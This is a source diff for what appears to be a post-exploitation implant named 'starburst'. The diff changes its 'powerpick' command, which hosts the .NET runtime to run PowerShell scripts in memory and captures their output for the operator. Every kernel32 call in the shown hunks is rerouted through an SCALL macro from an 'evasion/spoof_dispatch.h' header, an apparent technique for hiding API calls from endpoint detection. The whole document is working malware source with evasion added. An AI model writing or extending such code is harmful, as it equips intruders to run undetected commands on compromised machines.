@@ -6,6 +6,7 @@
 #include <config.h>
 #include <strings.h>
 #include <stackstr.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_POWERPICK
 
@@ -126,7 +127,7 @@ static auto WINAPI declfn pipe_reader_pp( LPVOID param ) -> DWORD {
 
     while ( !ctx->done ) {
         available = 0;
-        if ( !inst.kernel32.PeekNamedPipe( ctx->h_pipe_read,
+        if ( !SCALL( inst, kernel32.PeekNamedPipe, ctx->h_pipe_read,
                 nullptr, 0, nullptr, &available, nullptr ) )
             break;
 
@@ -139,18 +140,18 @@ static auto WINAPI declfn pipe_reader_pp( LPVOID param ) -> DWORD {
                 ctx->output_cap = new_cap;
             }
             bytes_read = 0;
-            inst.kernel32.ReadFile( ctx->h_pipe_read,
+            SCALL( inst, kernel32.ReadFile, ctx->h_pipe_read,
                 ctx->output_buf + ctx->output_len,
                 available, &bytes_read, nullptr );
             ctx->output_len += bytes_read;
         } else {
-            inst.kernel32.Sleep( 10 );
+            SCALL( inst, kernel32.Sleep, 10 );
         }
     }
 
     while ( true ) {
         available = 0;
-        if ( !inst.kernel32.PeekNamedPipe( ctx->h_pipe_read,
+        if ( !SCALL( inst, kernel32.PeekNamedPipe, ctx->h_pipe_read,
                 nullptr, 0, nullptr, &available, nullptr ) )
             break;
         if ( available == 0 ) break;
@@ -163,7 +164,7 @@ static auto WINAPI declfn pipe_reader_pp( LPVOID param ) -> DWORD {
             ctx->output_cap = new_cap;
         }
         bytes_read = 0;
-        inst.kernel32.ReadFile( ctx->h_pipe_read,
+        SCALL( inst, kernel32.ReadFile, ctx->h_pipe_read,
             ctx->output_buf + ctx->output_len,
             available, &bytes_read, nullptr );
         ctx->output_len += bytes_read;
@@ -198,7 +199,7 @@ auto declfn starburst::cmd_powerpick(
 
     // load oleaut32 for SAFEARRAY + BSTR functions
     STK_OLEAUT32(_n1);
-    auto h_oleaut32 = inst.kernel32.LoadLibraryA( _n1 );
+    auto h_oleaut32 = (HMODULE)SCALL( inst, kernel32.LoadLibraryA, _n1 );
     if ( !h_oleaut32 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "oleaut32 load failed" ) ) );
@@ -238,7 +239,7 @@ auto declfn starburst::cmd_powerpick(
         sa_pipe.nLength = sizeof( SECURITY_ATTRIBUTES );
         sa_pipe.bInheritHandle = TRUE;
 
-        inst.kernel32.CreatePipe(
+        SCALL( inst, kernel32.CreatePipe,
             &inst.powerpick.pipe_read,
             &inst.powerpick.pipe_write, &sa_pipe, 0 );
 
@@ -251,7 +252,7 @@ auto declfn starburst::cmd_powerpick(
 
     // load mscoree.dll for CLR hosting
     STK_MSCOREE(_n2);
-    auto h_mscoree = inst.kernel32.LoadLibraryA( _n2 );
+    auto h_mscoree = (HMODULE)SCALL( inst, kernel32.LoadLibraryA, _n2 );
     if ( !h_mscoree ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "mscoree.dll load failed" ) ) );
@@ -416,7 +417,7 @@ auto declfn starburst::cmd_powerpick(
     uint32_t wide_len = script_len + 1;
     auto wide_script = static_cast<wchar_t*>( inst.heap_alloc( wide_len * sizeof( wchar_t ) ) );
     memory::zero( wide_script, wide_len * sizeof( wchar_t ) );
-    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, script_str, script_len, wide_script, wide_len - 1 );
+    SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, script_str, script_len, wide_script, wide_len - 1 );
     BSTR bstr_script = pSysAllocString( wide_script );
     inst.heap_free( wide_script );
 
@@ -454,7 +455,7 @@ auto declfn starburst::cmd_powerpick(
     reader_ctx.h_pipe_read = inst.powerpick.pipe_read;
     reader_ctx.done        = 0;
 
-    HANDLE h_reader = inst.kernel32.CreateThread(
+    HANDLE h_reader = (HANDLE)SCALL( inst, kernel32.CreateThread,
         nullptr, 0,
         reinterpret_cast<LPTHREAD_START_ROUTINE>( pipe_reader_pp ),
         &reader_ctx, 0, nullptr );
@@ -468,8 +469,8 @@ auto declfn starburst::cmd_powerpick(
 
     reader_ctx.done = 1;
     if ( h_reader ) {
-        inst.kernel32.WaitForSingleObject( h_reader, 5000 );
-        inst.kernel32.CloseHandle( h_reader );
+        SCALL( inst, kernel32.WaitForSingleObject, h_reader, 5000 );
+        SCALL( inst, kernel32.CloseHandle, h_reader );
     }
 
     uint8_t* output_buf = reader_ctx.output_buf;
